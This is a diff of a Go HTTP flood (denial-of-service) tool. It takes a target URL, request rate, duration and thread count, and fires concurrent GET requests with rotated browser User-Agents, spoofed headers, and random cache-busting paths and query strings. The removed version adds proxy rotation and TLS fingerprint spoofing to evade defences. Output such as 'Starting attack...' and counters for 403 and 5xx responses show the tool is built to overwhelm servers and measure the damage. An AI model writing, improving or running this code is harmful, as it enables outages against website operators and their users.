@@ -1,40 +1,32 @@
 package main
 
 import (
+	"context"
+	"crypto/tls"
 	"fmt"
 	"log"
 	"math/rand"
+	"net"
+	"net/http"
 	"net/url"
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
-
-	"github.com/bogdanfinn/tls-client/profiles"
-
-	http "github.com/bogdanfinn/fhttp"
-	tls_client "github.com/bogdanfinn/tls-client"
-	//tls "github.com/bogdanfinn/utls"
 )
 
 var (
-	// Multiple browser profiles for diversity
-	browserProfiles = []profiles.ClientProfile{
-		profiles.Chrome_120,
-		profiles.Chrome_124,
-		profiles.Firefox_120,
-		profiles.Chrome_133_PSK,
-		profiles.Chrome_131,
-	}
-	
-	// Realistic User-Agents
+	// Realistic User-Agents for diversity
 	userAgents = []string{
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 	}
 	
 	// Accept languages for diversity
@@ -46,43 +38,32 @@ var (
 		"zh-CN,zh;q=0.9,en;q=0.8",
 	}
 
-	proxies []string
-	cached  = false
-	rate    int
-	target  string
+	cached       bool
+	rate         int
+	target       string
+	targetURL    *url.URL
 	
 	status_200   uint64
 	status_403   uint64
 	status_5xx   uint64
 	status_other uint64
+	
+	// Connection pool for reuse
+	clientPool sync.Pool
 )
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
-	if len(os.Args) < 6 {
-		log.Fatalf("Usage: %s <url> <rate> <secs> <threads> <proxies.txt> [--cached]", os.Args[0])
+	if len(os.Args) < 5 {
+		log.Fatalf("Usage: %s <url> <rate> <secs> <threads> [--cached]", os.Args[0])
 	}
 	
-	proxiesString, err := os.ReadFile(os.Args[5])
-	if err != nil {
-		log.Fatal("Failed to read proxy file")
-	}
-	allProxies := strings.Split(strings.ReplaceAll(string(proxiesString), "\r\n", "\n"), "\n")
-	// Filter out empty lines
-	for _, proxy := range allProxies {
-		if strings.TrimSpace(proxy) != "" {
-			proxies = append(proxies, strings.TrimSpace(proxy))
-		}
-	}
-	if len(proxies) == 0 {
-		log.Fatal("No valid proxies found in file")
-	}
-	
-	lol, err := url.Parse(os.Args[1])
+	var err error
+	targetURL, err = url.Parse(os.Args[1])
 	if err != nil {
 		log.Fatal("Failed to parse url")
 	}
-	if lol.Host == "" {
+	if targetURL.Host == "" {
 		log.Fatal("Invalid url provided")
 	}
 	
@@ -105,6 +86,17 @@ func main() {
 		target = prepareUrl(target)
 	}
 
+	// Initialize client pool
+	clientPool = sync.Pool{
+		New: func() interface{} {
+			return createOptimizedClient()
+		},
+	}
+
+	fmt.Printf("RAW High-Performance Flood\nTarget: %s\nRate: %d/s\nThreads: %d\nDuration: %ds\n", target, rate, thr, secs)
+	fmt.Println("Starting attack...")
+
+	// Start worker threads
 	for i := 0; i < thr; i++ {
 		if cached {
 			go flooderCached()
@@ -112,91 +104,104 @@ func main() {
 			go flooder()
 		}
 	}
-	go nuller()
-	fmt.Println("Advanced Browser-like Flood by Context7 x bogdanfinn/tls-client!\nEnjoy realistic flooding...")
+	
+	// Start stats reporter
+	go statsReporter()
+	
+	// Wait for duration
 	time.Sleep(time.Duration(secs) * time.Second)
+	
+	// Print final stats
+	fmt.Printf("\nFinal Stats:\n200 OK: %d\n403 FBDN: %d\n5xx DROP: %d\nOTHER: %d\n", 
+		atomic.LoadUint64(&status_200), 
+		atomic.LoadUint64(&status_403), 
+		atomic.LoadUint64(&status_5xx), 
+		atomic.LoadUint64(&status_other))
 }
 
-func createRealisticClient() (tls_client.HttpClient, error) {
-	// Random browser profile for TLS fingerprinting
-	profile := browserProfiles[rand.Intn(len(browserProfiles))]
-	
-	// Create cookie jar for session persistence
-	jar := tls_client.NewCookieJar()
-	
-	options := []tls_client.HttpClientOption{
-		tls_client.WithTimeoutSeconds(10),
-		tls_client.WithInsecureSkipVerify(),
-		tls_client.WithClientProfile(profile),
-		tls_client.WithCookieJar(jar),
-		tls_client.WithNotFollowRedirects(), // Control redirects manually
+func createOptimizedClient() *http.Client {
+	// Create custom transport with optimized settings
+	transport := &http.Transport{
+		Proxy: nil, // No proxy - direct connection
+		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+			dialer := &net.Dialer{
+				Timeout:   5 * time.Second,
+				KeepAlive: 30 * time.Second,
+				DualStack: true,
+			}
+			// Optimize TCP settings
+			conn, err := dialer.DialContext(ctx, network, addr)
+			if err != nil {
+				return nil, err
+			}
+			// Set TCP no delay for lower latency
+			if tcpConn, ok := conn.(*net.TCPConn); ok {
+				tcpConn.SetNoDelay(true)
+				tcpConn.SetKeepAlive(true)
+				tcpConn.SetKeepAlivePeriod(30 * time.Second)
+			}
+			return conn, nil
+		},
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+			MinVersion:         tls.VersionTLS12,
+			MaxVersion:         tls.VersionTLS13,
+			CipherSuites: []uint16{
+				tls.TLS_AES_128_GCM_SHA256,
+				tls.TLS_AES_256_GCM_SHA384,
+				tls.TLS_CHACHA20_POLY1305_SHA256,
+				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			},
+			PreferServerCipherSuites: false,
+			SessionTicketsDisabled:   false,
+			ClientSessionCache:       tls.NewLRUClientSessionCache(64),
+		},
+		MaxIdleConns:          1000,
+		MaxIdleConnsPerHost:   100,
+		MaxConnsPerHost:       0, // No limit
+		IdleConnTimeout:       90 * time.Second,
+		DisableCompression:    false,
+		DisableKeepAlives:     false,
+		ExpectContinueTimeout: 1 * time.Second,
+		ResponseHeaderTimeout: 10 * time.Second,
+		ForceAttemptHTTP2:     true,
 	}
 
-	return tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
+	return &http.Client{
+		Transport: transport,
+		Timeout:   10 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse // Don't follow redirects
+		},
+	}
 }
 
-func getRealisticHeaders() http.Header {
+func getOptimizedHeaders() http.Header {
 	userAgent := userAgents[rand.Intn(len(userAgents))]
 	acceptLang := acceptLanguages[rand.Intn(len(acceptLanguages))]
 	
-	// Vary cache control based on browser behavior
-	cacheControls := []string{"no-cache", "max-age=0", "no-store"}
-	cacheControl := cacheControls[rand.Intn(len(cacheControls))]
-	
 	headers := http.Header{
-		"accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
-		"accept-encoding":           {"gzip, deflate, br, zstd"},
-		"accept-language":           {acceptLang},
-		"cache-control":             {cacheControl},
-		"pragma":                    {"no-cache"},
-		"sec-ch-ua":                 {`"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="24"`},
-		"sec-ch-ua-mobile":          {"?0"},
-		"sec-ch-ua-platform":        {`"Windows"`},
-		"sec-fetch-dest":            {"document"},
-		"sec-fetch-mode":            {"navigate"},
-		"sec-fetch-site":            {"none"},
-		"sec-fetch-user":            {"?1"},
-		"upgrade-insecure-requests": {"1"},
-		"user-agent":                {userAgent},
+		"User-Agent":                {userAgent},
+		"Accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
+		"Accept-Language":           {acceptLang},
+		"Accept-Encoding":           {"gzip, deflate, br"},
+		"Cache-Control":             {"no-cache"},
+		"Upgrade-Insecure-Requests": {"1"},
+		"Connection":                {"keep-alive"},
 	}
 	
-	// Critical: Header ordering exactly like real browsers
+	// Add browser-specific headers
 	if strings.Contains(userAgent, "Chrome") {
-		headers[http.HeaderOrderKey] = []string{
-			"accept",
-			"accept-encoding", 
-			"accept-language",
-			"cache-control",
-			"pragma",
-			"sec-ch-ua",
-			"sec-ch-ua-mobile",
-			"sec-ch-ua-platform", 
-			"sec-fetch-dest",
-			"sec-fetch-mode",
-			"sec-fetch-site",
-			"sec-fetch-user",
-			"upgrade-insecure-requests",
-			"user-agent",
-		}
-	} else if strings.Contains(userAgent, "Firefox") {
-		// Firefox has different header ordering
-		headers[http.HeaderOrderKey] = []string{
-			"accept",
-			"accept-language",
-			"accept-encoding",
-			"cache-control",
-			"pragma", 
-			"upgrade-insecure-requests",
-			"user-agent",
-		}
-		// Remove Chrome-specific headers
-		delete(headers, "sec-ch-ua")
-		delete(headers, "sec-ch-ua-mobile")
-		delete(headers, "sec-ch-ua-platform")
-		delete(headers, "sec-fetch-dest")
-		delete(headers, "sec-fetch-mode")
-		delete(headers, "sec-fetch-site")
-		delete(headers, "sec-fetch-user")
+		headers["Sec-Ch-Ua"] = []string{`"Chromium";v="120", "Google Chrome";v="120", "Not_A Brand";v="24"`}
+		headers["Sec-Ch-Ua-Mobile"] = []string{"?0"}
+		headers["Sec-Ch-Ua-Platform"] = []string{`"Windows"`}
+		headers["Sec-Fetch-Dest"] = []string{"document"}
+		headers["Sec-Fetch-Mode"] = []string{"navigate"}
+		headers["Sec-Fetch-Site"] = []string{"none"}
+		headers["Sec-Fetch-User"] = []string{"?1"}
 	}
 	
 	return headers
@@ -204,12 +209,12 @@ func getRealisticHeaders() http.Header {
 
 func randPath() string {
 	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	b := make([]byte, rand.Intn(10)+5) // Random length 5-15
+	b := make([]byte, rand.Intn(10)+5)
 	for i := range b {
 		b[i] = charset[rand.Intn(len(charset))]
 	}
 	
-	extensions := []string{".js", ".css", ".html", ".php", ".asp", ".jsp"}
+	extensions := []string{".js", ".css", ".html", ".php", ".asp", ".jsp", ".json", ".xml"}
 	ext := extensions[rand.Intn(len(extensions))]
 	return fmt.Sprintf("%s%s", string(b), ext)
 }
@@ -225,140 +230,129 @@ func prepareUrl(urlToModify string) string {
 }
 
 func flooder() {
+	// Get client from pool
+	client := clientPool.Get().(*http.Client)
+	defer clientPool.Put(client)
+	
+	// Create request buffer for reuse
+	reqBuf := make([]*http.Request, rate)
+	
 	for {
-		proxyString := proxies[rand.Intn(len(proxies))]
-		if strings.TrimSpace(proxyString) == "" {
-			continue
+		// Prepare batch of requests
+		for i := 0; i < rate; i++ {
+			req, err := http.NewRequest("GET", target, nil)
+			if err != nil {
+				continue
+			}
+			req.Header = getOptimizedHeaders()
+			req.Close = false // Keep connection alive
+			reqBuf[i] = req
 		}
 		
-		c, err := createRealisticClient()
-		if err != nil {
-			continue
-		}
-		
-		err = c.SetProxy(fmt.Sprintf("http://%s", strings.TrimSpace(proxyString)))
-		if err != nil {
-			c.CloseIdleConnections()
-			continue
-		}
-		
-		// Use same client for multiple requests (session simulation)
-		for cycles := 0; cycles < 20; cycles++ {
-			for i := 0; i < rate; i++ {
-				req, err := http.NewRequest("GET", target, nil)
+		// Send requests in rapid succession
+		for i := 0; i < rate; i++ {
+			if reqBuf[i] == nil {
+				continue
+			}
+			
+			go func(req *http.Request) {
+				resp, err := client.Do(req)
 				if err != nil {
-					continue
+					atomic.AddUint64(&status_other, 1)
+					return
 				}
 				
-				// Get realistic headers for each request
-				req.Header = getRealisticHeaders()
-				
-				res, err := c.Do(req)
-				if err != nil {
-					continue
-				}
-				
-				res.Body.Close()
-				
-				if res.StatusCode == 200 {
+				// Quick status code check
+				switch {
+				case resp.StatusCode == 200:
 					atomic.AddUint64(&status_200, 1)
-				} else if res.StatusCode == 403 {
+				case resp.StatusCode == 403:
 					atomic.AddUint64(&status_403, 1)
-				} else if res.StatusCode < 600 && res.StatusCode > 499 {
+				case resp.StatusCode >= 500 && resp.StatusCode < 600:
 					atomic.AddUint64(&status_5xx, 1)
-				} else {
+				default:
 					atomic.AddUint64(&status_other, 1)
 				}
 				
-				// Random small delay to simulate human behavior
-				if rand.Intn(20) == 0 {
-					time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
-				}
-			}
+				// Quickly drain and close body
+				resp.Body.Close()
+			}(reqBuf[i])
 		}
-		c.CloseIdleConnections()
+		
+		// Small delay between batches to prevent overwhelming
+		time.Sleep(time.Millisecond)
 	}
 }
 
 func flooderCached() {
+	// Get client from pool
+	client := clientPool.Get().(*http.Client)
+	defer clientPool.Put(client)
+	
+	// Pre-generate random paths for efficiency
+	paths := make([]string, 100)
+	for i := range paths {
+		paths[i] = randPath()
+	}
+	pathIndex := 0
+	
 	for {
-		proxyString := proxies[rand.Intn(len(proxies))]
-		if strings.TrimSpace(proxyString) == "" {
-			continue
-		}
-		
-		c, err := createRealisticClient()
-		if err != nil {
-			continue
-		}
-		
-		err = c.SetProxy(fmt.Sprintf("http://%s", strings.TrimSpace(proxyString)))
-		if err != nil {
-			c.CloseIdleConnections()
-			continue
-		}
-		
-		// Use same client for multiple requests (session simulation)
-		for cycles := 0; cycles < 20; cycles++ {
-			for i := 0; i < rate; i++ {
-				// Generate random path for cache busting
-				randomUrl := strings.ReplaceAll(target, "SOMESHIT.js", randPath())
-				req, err := http.NewRequest("GET", randomUrl, nil)
+		for i := 0; i < rate; i++ {
+			// Rotate through pre-generated paths
+			randomUrl := strings.ReplaceAll(target, "SOMESHIT.js", paths[pathIndex])
+			pathIndex = (pathIndex + 1) % len(paths)
+			
+			// Add cache-busting parameters
+			if rand.Intn(3) == 0 {
+				randomUrl += fmt.Sprintf("?v=%d&t=%d", rand.Intn(1000000), time.Now().Unix())
+			}
+			
+			req, err := http.NewRequest("GET", randomUrl, nil)
+			if err != nil {
+				continue
+			}
+			
+			req.Header = getOptimizedHeaders()
+			req.Close = false
+			
+			go func(req *http.Request) {
+				resp, err := client.Do(req)
 				if err != nil {
-					continue
+					atomic.AddUint64(&status_other, 1)
+					return
 				}
 				
-				// Get realistic headers for each request
-				req.Header = getRealisticHeaders()
-				
-				// Add random query parameters for cache busting
-				if rand.Intn(5) == 0 {
-					params := url.Values{}
-					params.Add("v", fmt.Sprintf("%d", rand.Intn(1000000)))
-					params.Add("t", fmt.Sprintf("%d", time.Now().Unix()))
-					if strings.Contains(randomUrl, "?") {
-						randomUrl += "&" + params.Encode()
-					} else {
-						randomUrl += "?" + params.Encode()
-					}
-					req.URL, _ = url.Parse(randomUrl)
-				}
-				
-				res, err := c.Do(req)
-				if err != nil {
-					continue
-				}
-				
-				res.Body.Close()
-				
-				if res.StatusCode == 200 {
+				// Quick status code check
+				switch {
+				case resp.StatusCode == 200:
 					atomic.AddUint64(&status_200, 1)
-				} else if res.StatusCode == 403 {
+				case resp.StatusCode == 403:
 					atomic.AddUint64(&status_403, 1)
-				} else if res.StatusCode < 600 && res.StatusCode > 499 {
+				case resp.StatusCode >= 500 && resp.StatusCode < 600:
 					atomic.AddUint64(&status_5xx, 1)
-				} else {
+				default:
 					atomic.AddUint64(&status_other, 1)
 				}
 				
-				// Random small delay to simulate human behavior
-				if rand.Intn(20) == 0 {
-					time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
-				}
-			}
+				resp.Body.Close()
+			}(req)
 		}
-		c.CloseIdleConnections()
+		
+		// Small delay between batches
+		time.Sleep(time.Millisecond)
 	}
 }
 
-func nuller() {
-	fmt.Printf("REALISTIC BROWSER STATS:\n200 OK: %d\n403 FBDN: %d\n5xx DROP: %d\nOTHER: %d\n", status_200, status_403, status_5xx, status_other)
-	for {
-		time.Sleep(1 * time.Second)
-		fmt.Printf("\033[1A\033[2K\033[1A\033[2K\033[1A\033[2K\033[1A\033[2K\033[1A\033[2KREALISTIC BROWSER STATS:\n200 OK: %d\n403 FBDN: %d\n5xx DROP: %d\nOTHER: %d\n", status_200, status_403, status_5xx, status_other)
-		atomic.StoreUint64(&status_200, 0)
-		atomic.StoreUint64(&status_403, 0)
-		atomic.StoreUint64(&status_5xx, 0)
-		atomic.StoreUint64(&status_other, 0)
+func statsReporter() {
+	ticker := time.NewTicker(time.Second)
+	defer ticker.Stop()
+	
+	fmt.Println("\nRAW FLOOD STATS:")
+	for range ticker.C {
+		fmt.Printf("\r200 OK: %d | 403 FBDN: %d | 5xx DROP: %d | OTHER: %d", 
+			atomic.LoadUint64(&status_200), 
+			atomic.LoadUint64(&status_403), 
+			atomic.LoadUint64(&status_5xx), 
+			atomic.LoadUint64(&status_other))
 	}
 }
